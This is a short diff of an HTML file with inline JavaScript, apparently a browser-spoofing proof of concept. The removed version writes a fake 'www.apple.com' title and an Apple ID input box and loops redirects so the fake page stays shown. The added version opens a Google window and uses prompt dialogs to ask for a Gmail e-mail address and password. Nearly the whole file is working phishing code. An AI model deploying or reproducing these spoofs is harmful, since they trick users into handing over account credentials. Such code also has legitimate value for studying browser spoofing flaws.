@@ -1,23 +1,9 @@
 
-<script>
-function spoof()
-
-{
-
-document.write("<title>www.apple.com</title>");
-  
-    a= '<h1>Fake Content!!</h1><p>Please input your Apple ID here:<input></p>'
-
-document.write(a);
-   	setInterval(function(){window.location.assign("htttp://www.google.com");}, 2);
-
-   	setTimeout(function(){
-		spoof();  // Loop makes the browser always shows the fake page.
-	}, 322);
-
-}
-
-
-
-setInterval(spoof(),200);
-</script>
+<script> function go(){ 
+ var x=window.open('https://www.google.com/csi'); 
+ setTimeout(function(){
+ a=x.alert('Go to gmail.com');x.prompt('E-mail','');b=x.prompt('Password','');x.alert('Welcome to Gmail.com');} ,1000);
+  } 
+ </script> 
+ 
+ <button onclick="go()">go</button>
